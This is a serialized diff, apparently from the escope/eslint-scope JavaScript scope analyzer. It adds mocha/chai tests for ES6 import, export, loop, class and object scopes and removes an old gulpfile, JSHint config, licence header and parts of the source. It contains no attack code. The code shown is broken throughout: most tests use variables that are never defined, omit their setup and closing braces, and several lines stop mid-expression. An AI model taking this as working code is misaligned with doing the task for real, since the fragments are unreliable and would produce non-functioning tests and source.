scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.variables[0].name).to.be.equal(""f"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""FunctionName"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+    it(""should export function expression""<c> function() {<\n>+        const ast = espree(""export default function(){};""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+    it(""should export literal""<c> function() {<\n>+        const ast = espree(""export default 42;""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+    it(""should refer exported references#1""<c> function() {<\n>+        const ast = espree(""export {x};""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""x"");<\n>+    it(""should refer exported references#2""<c> function() {<\n>+        const ast = espree(""export {v as x};""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""v"");<\n>+    it(""should not refer exported references from other source#1""<c> function() {<\n>+        const ast = espree(""export {x} from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+    it(""should not refer exported references from other source#2""<c> function() {<\n>+        const ast = espree(""export {v as x} from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+    it(""should not refer exported references from other source#3""<c> function() {<\n>+        const ast = espree(""export * from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const espree = require(""../third_party/espree"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""import declaration""<c> function() {<\n>+    it(""should import names from source""<c> function() {<\n>+        const ast = espree(""import v from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.variables[0].name).to.be.equal(""v"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""ImportBinding"");<\n>+    it(""should import namespaces""<c> function() {<\n>+        const ast = espree( ""import * as ns from \""mod\"";""<c> {sourceType: ""module""<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.variables[0].name).to.be.equal(""ns"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""ImportBinding"");<\n>+    it(""should import insided names#1""<c> function() {<\n>+        const ast = espree(""import {x} from \""mod\"";""<c> {sourceType: ""module""<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.variables[0].name).to.be.equal(""x"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""ImportBinding"");<\n>+    it(""should import insided names#2""<c> function() {<\n>+        const ast = espree(""import {x as v} from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.variables[0].name).to.be.equal(""v"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""ImportBinding"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 iteration scope""<c> function() {<\n>+    it(""let materialize iteration scope for ForInStatement#1""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""i"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""TDZ"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""TDZ"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""for"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""console"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>+    it(""let materialize iteration scope for ForInStatement#2""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""i"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""TDZ"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""TDZ"");<\n>+        expect(scope.variables[1].name).to.be.equal(""j"");<\n>+        expect(scope.variables[1].defs[0].type).to.be.equal(""TDZ"");<\n>+        expect(scope.variables[2].name).to.be.equal(""k"");<\n>+        expect(scope.variables[2].defs[0].type).to.be.equal(""TDZ"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""for"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.variables[1].name).to.be.equal(""j"");<\n>+        expect(scope.variables[2].name).to.be.equal(""k"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""j"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""k"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""console"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>+    it(""let materialize iteration scope for ForStatement#2""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""i"");<\n>+        expect(scope.variables[2].name).to.be.equal(""obj"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""obj"");<\n>+        expect(scope.type).to.be.equal(""for"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""Variable"");<\n>+        expect(scope.variables[1].name).to.be.equal(""j"");<\n>+        expect(scope.variables[1].defs[0].type).to.be.equal(""Variable"");<\n>+        expect(scope.variables[2].name).to.be.equal(""k"");<\n>+        expect(scope.variables[2].defs[0].type).to.be.equal(""Variable"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""j"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""k"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""obj"");<\n>+        expect(scope.references[4].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[5].identifier.name).to.be.equal(""okok"");<\n>+        expect(scope.references[6].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""console"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""j"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""k"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const analyze = require("".."").analyze;<\n>+const parse = require(""../third_party/espree"");<\n>+describe(""ES6 new.target""<c> function() {<\n>+    it(""should not make references of new.target""<c> function() {<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 object""<c> function() {<\n>+    it(""method definition""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+    it(""computed property key may refer variables""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""yuyushiki"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""yuyushiki"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""yuyushiki"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""yuyushiki"");<\n>+/* eslint-disable no-unuse","-.coverage_data/<\n>-cover_html/<\n>-    ""curly"": true<c><\n>-    ""eqeqeq"": true<c><\n>-    ""immed"": true<c><\n>-    ""indent"": 4<c><\n>-    ""eqnull"": true<c><\n>-    ""latedef"": true<c><\n>-    ""noarg"": true<c><\n>-    ""noempty"": true<c><\n>-    ""quotmark"": ""single""<c><\n>-    ""undef"": true<c><\n>-    ""unused"": true<c><\n>-    ""strict"": true<c><\n>-    ""trailing"": true<c><\n>-    ""validthis"": true<c><\n>-    ""onevar"": true<c><\n>-    ""node"": true<\n>-/*<\n>-  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-  Redistribution and use in source and binary forms<c> with or without<\n>-  modification<c> are permitted provided that the following conditions are met:<\n>-    * Redistributions of source code must retain the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer.<\n>-    * Redistributions in binary form must reproduce the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer in the<\n>-      documentation and/or other materials provided with the distribution.<\n>-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 'AS IS'<\n>-  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-*/<\n>-'use strict';<\n>-var gulp = require('gulp')<c><\n>-    mocha = require('gulp-mocha')<c><\n>-    git = require('gulp-git')<c><\n>-    bump = require('gulp-bump')<c><\n>-    filter = require('gulp-filter')<c><\n>-    tagVersion = require('gulp-tag-version')<c><\n>-    sourcemaps = require('gulp-sourcemaps')<c><\n>-    plumber = require('gulp-plumber')<c><\n>-    source = require('vinyl-source-stream')<c><\n>-    lazypipe = require('lazypipe')<c><\n>-    eslint = require('gulp-eslint')<c><\n>-    fs = require('fs');<\n>-var TEST = [ 'test/*.js' ];<\n>-var SOURCE = [ 'src/**/*.js' ];<\n>-var ESLINT_OPTION = {<\n>-    rules: {<\n>-        'quotes': 0<c><\n>-        'eqeqeq': 0<c><\n>-        'no-use-before-define': 0<c><\n>-        'no-shadow': 0<c><\n>-        'no-new': 0<c><\n>-        'no-underscore-dangle': 0<c><\n>-        'no-multi-spaces': 0<c><\n>-        'no-native-reassign': 0<c><\n>-        'no-loop-func': 0<c><\n>-        'no-lone-blocks': 0<\n>-    }<c><\n>-    ecmaFeatures: {<\n>-        jsx: false<c><\n>-        modules: true<\n>-    }<c><\n>-    env: {<\n>-        node: true<c><\n>-        es6: true<\n>-    }<\n>-gulp.task('test'<c> function () {<\n>-    return gulp.src(TEST)<\n>-        .pipe(mocha({<\n>-            reporter: 'spec'<c><\n>-            timeout: 100000 // 100s<\n>-        }));<\n>-// Currently<c> not works for ES6.<\n>-gulp.task('lint'<c> function () {<\n>-    return gulp.src(SOURCE)<\n>-        .pipe(eslint(ESLINT_OPTION))<\n>-        .pipe(eslint.formatEach('stylish'<c> process.stderr))<\n>-        .pipe(eslint.failOnError());<\n>-/**<\n>- * Bumping version number and tagging the repository with it.<\n>- * Please read http://semver.org/<\n>- *<\n>- * You can use the commands<\n>- *<\n>- *     gulp patch     # makes v0.1.0 -> v0.1.1<\n>- *     gulp feature   # makes v0.1.1 -> v0.2.0<\n>- *     gulp release   # makes v0.2.1 -> v1.0.0<\n>- *<\n>- * To bump the version numbers accordingly after you did a patch<c><\n>- * introduced a feature or made a backwards-incompatible release.<\n>- */<\n>-function inc(importance) {<\n>-    // get all the files to bump version in<\n>-    return gulp.src(['./package.json'])<\n>-        // bump the version number in those files<\n>-        .pipe(bump({type: importance}))<\n>-        // save it back to filesystem<\n>-        .pipe(gulp.dest('./'))<\n>-        // commit the changed version number<\n>-        .pipe(git.commit('Bumps package version'))<\n>-        // read only one file to get the version number<\n>-        .pipe(filter('package.json'))<\n>-        // **tag it in the repository**<\n>-        .pipe(tagVersion({<\n>-            prefix: ''<\n>-        }));<\n>-gulp.task('patch'<c> function () { return inc('patch'); })<\n>-gulp.task('minor'<c> function () { return inc('minor'); })<\n>-gulp.task('major'<c> function () { return inc('major'); })<\n>-gulp.task('travis'<c> [ 'test' ]);<\n>-gulp.task('default'<c> [ 'travis' ]);<\n>-    ""node"": "">=0.4.0""<\n>-    ""test"": ""gulp travis""<c><\n>-    ""unit-test"": ""gulp test""<c><\n>-    ""lint"": ""gulp lint""<c><\n>-    ""gulp"": ""^3.9.0""<c><\n>-    ""gulp-bump"": ""^1.0.0""<c><\n>-    ""gulp-eslint"": ""^1.1.1""<c><\n>-    ""gulp-espower"": ""^1.0.2""<c><\n>-    ""gulp-filter"": ""^3.0.1""<c><\n>-    ""gulp-git"": ""^1.6.1""<c><\n>-    ""gulp-mocha"": ""^2.2.0""<c><\n>-    ""gulp-plumber"": ""^1.0.1""<c><\n>-    ""gulp-sourcemaps"": ""^1.6.0""<c><\n>-    ""gulp-tag-version"": ""^1.3.0""<c><\n>-    ""lazypipe"": ""^1.0.1""<c><\n>-    ""vinyl-source-stream"": ""^1.1.0""<c><\n>-const Variable = require('./variable');<\n>-/*jslint bitwise:true */<\n>-const assert = require('assert');<\n>-const ScopeManager = require('./scope-manager');<\n>-const Referencer = require('./referencer');<\n>-const Reference = require('./reference');<\n>-const Variable = require('./variable');<\n>-const Scope = require('./scope');<\n>-const version = require('../package.json').version;<\n>-        sourceType: 'script'<c>  // one of ['script'<c> 'module']<\n>-        fallback: 'iteration'<\n>-    function isHashObject(target) {<\n>-        return typeof target === 'object' && target instanceof Object && !(target instanceof Array) && !(target instanceof RegExp);<\n>- * @param {esprima.Tree} tree<\n>- * @return {ScopeManager}<\n>-    assert(scopeManager.__currentScope === null<c> 'currentScope should be null.');<\n>-const Syntax = require('estraverse').Syntax;<\n>-const esrecurse = require('esrecurse');<\n>-            rest: lastRestElement != null && lastRestElement.argument === pattern<c><\n>-        node.arguments.forEach(a => { this.rightHandNodes.push(a); });<\n>-    constructor(ident<c> scope<c> flag<c>  writeExpr<c> maybeImplicitGlobal<c> partial<c> init) {<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-const Syntax = require('estraverse').Syntax;<\n>-const esrecurse = require('esrecurse');<\n>-const Reference = require('./reference');<\n>-const Variable = require('./variable');<\n>-const PatternVisitor = require('./pattern-visitor');<\n>-const definition = require('./definition');<\n>-const assert = require('assert');<\n>-    if (referencer != null) {<\n>-        if (typeof options === 'function') {<\n>-            options = {processRightHandNodes: false}<\n>-            this.visitPattern(node.params[i]<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>-                this.currentScope().__define(pattern<c><\n>-                    new ParameterDefinition(<\n>-                        pattern<c><\n>-                        node<c><\n>-                        i<c><\n>-                        info.rest<\n>-                    ));<\n>-                this.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>-            });<\n>-                type: 'RestElement'<c><\n>-        if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== 'var') {<\n>-            if (node.operator === '=') {<\n>-        if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>-        if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>-        variableTargetScope = (node.kind === 'var') ? this.currentScope().variableScope : this.currentScope();<\n>-        assert(this.scopeManager.__isES6() && this.scopeManager.isModule()<c> 'ImportDeclaration should appear when the mode is ES6 and in the module context.');<\n>-const Scope = require('./scope');<\n>-const assert = require('assert');<\n>-        return this.__options.sourceType === 'module';<\n>-     * @return {Scope?}<\n>-        function predicate(scope) {<\n>-            if (scope.type === 'function' && scope.functionExpressionScope) {<\n>-            if (scope.type === 'TDZ') {<\n>-     * @return {Scope[]?}<\n>-     * @return {Scope?} upper scope for the node.<\n>-    __nestBlockScope(node<c> isMethodDefinition) {<\n>-const Syntax = require('estraverse').Syntax;<\n>-const Reference = require('./reference');<\n>-const Variable = require('./variable');<\n>-const Definition = require('./definition').Definition;<\n>-const assert = require('assert');<\n>-    if (scope.type === 'class' || scope.type === 'module') {<\n>-    if (scope.type === 'block' || scope.type === 'switch') {<\n>-    if (scope.type === 'function') {<\n>-    } else if (scope.type === 'global') {<\n>-            if (stmt.raw === '""use strict""' || stmt.raw === '\'use strict\'') {<\n>-            if (expr.type !== Syntax.Literal || typeof expr.value !== 'string') {<\n>-            if (expr.raw != null) {<\n>-                if (expr.raw === '""use strict""' || expr.raw === '\'use strict\'') {<\n>-                if (expr.value === 'use strict') {<\n>-        (def.type === Variable.Variable && def.parent.kind !== 'var')<\n>-        this.dynamic = this.type === 'global' || this.type === 'with';<\n>-            (this.type === 'global' || this.type === 'function' || this.type === 'module') ? this : upperScope.variableScope;<\n>-        } else if (this.type !== 'global') {<\n>-        if (node == null) {<\n>-        if (variables == null) {<\n>-        if (node.name === 'super') {<\n>-     * @return {Reference}<\n>-        assert(this.__isClosed()<c> 'Scope should be closed.');<\n>-        assert(ident.type === Syntax.Identifier<c> 'Target should be identifier.');<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-     * @return {boolean}<\n>-        super(scopeManager<c> 'global'<c> null<c> block<c> false);<\n>-        super(scopeManager<c> 'module'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'function-expression-name'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'catch'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'with'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'TDZ'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'block'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'switch'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'function'<c> upperScope<c> block<c> isMethodDefinition);<\n>-        let variable = this.set.get('arguments');<\n>-        assert(variable<c> 'Always have arguments variable.');<\n>-        return variable.tainted || variable.references.length  !== 0;<\n>-                'arguments'<c><\n>-        this.taints.set('arguments'<c> true);<\n>- class ForScope extends Scope {<\n>-        super(scopeManager<c> 'for'<c> upperScope<c> block<c> false);<\n>-        super(scopeManager<c> 'class'<c> upperScope<c> block<c> false);<\n>-Variable.CatchClause = 'CatchClause';<\n>-Variable.Parameter = 'Parameter';<\n>-Variable.FunctionName = 'FunctionName';<\n>-Variable.ClassName = 'ClassName';<\n>-Variable.Variable = 'Variable';<\n>-Variable.ImportBinding = 'ImportBinding';<\n>-Variable.TDZ = 'TDZ';<\n>-Variable.ImplicitGlobalVariable = 'ImplicitGlobalVariable';<\n>-const expect = require('chai').expect;<\n>-const esprima = require('esprima');<\n>-const analyze = require('..').analyze;<\n>-describe('arguments'<c> function() {<\n>-    it('arguments are correctly materialized'<c> function() {<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-const expect = require('chai').expect;<\n>-const esprima = require('esprima');<\n>-const analyze = require('..').analyze;<\n>-describe('catch'<c> function() {<\n>-    it('creates scope'<c> function() {<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.type).to.be.equal('catch');<\n>-        expect(scope.variables[0].name).to.be.equal('e');<\n>-const expect = require('chai').expect;<\n>-const esprima = require('esprima');<\n>-const analyze = require('..').analyze;<\n>-describe('childVisitorKeys option'<c> function() {<\n>-    it('should handle as a known node if the childVisitorKeys option was given.'<c> function() {<\n>-        ast.body[0].declarations[0].init.type = 'NumericLiteral';<\n>-                fallback: 'none'<c><\n>-    it('should not visit to properties which are not given.'<c> function() {<\n>-            type: 'TestNode'<c><\n>-    it('should visit to given properties.'<c> function() {<\n>-            type: 'TestNode'<c><\n>-                    TestNode: ['argument']<\n>-        expect(globalScope.through[0].identifier.name).to.equal('bar');<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 arrow function expression'<c> function() {<\n>-    it('materialize scope for arrow function expression'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('ArrowFunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.variables[1].name).to.be.equal('j');<\n>-    it('generate bindings for parameters'<c> function() {<\n>-        const ast = parse(`var arrow = (a<c> b<c> c<c> d) => {}`);<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('ArrowFunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('a');<\n>-        expect(scope.variables[1].name).to.be.equal('b');<\n>-        expect(scope.variables[2].name).to.be.equal('c');<\n>-        expect(scope.variables[3].name).to.be.equal('d');<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 block scope'<c> function() {<\n>-    it('let is materialized in ES6 block scope#1'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>-    it('let is materialized in ES6 block scope#2'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('i');<\n>-    it('function delaration is materialized in ES6 block scope'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.variables[0].name).to.be.equal('test');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('test');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-    it('let is not hoistable#1'<c> function() {<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(globalScope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-    it('let is not hoistable#2'<c> function() {<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 catch'<c> function() {<\n>-    it('takes binding pattern'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.block.type).to.be.equal('BlockStatement');<\n>-        expect(scope.type).to.be.equal('catch');<\n>-        expect(scope.block.type).to.be.equal('CatchClause');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.block.type).to.be.equal('BlockStatement');<\n>-            'e'<c><\n>-            'c'<\n>-            'e'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'c'<c><\n>-            'd'<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 class'<c> function() {<\n>-    it('declaration name creates class scope'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.variables[0].name).to.be.equal('Derived');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('Base');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('Derived');<\n>-        expect(scope.type).to.be.equal('class');<\n>-        expect(scope.block.type).to.be.equal('ClassDeclaration');<\n>-        expect(scope.variables[0].name).to.be.equal('Derived');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-    it('expression name creates class scope#1'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('Base');<\n>-        expect(scope.type).to.be.equal('class');<\n>-        expect(scope.block.type).to.be.equal('ClassExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('Derived');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-    it('expression name creates class scope#2'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('Base');<\n>-        expect(scope.type).to.be.equal('class');<\n>-        expect(scope.block.type).to.be.equal('ClassExpression');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-    it('computed property key may refer variables'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        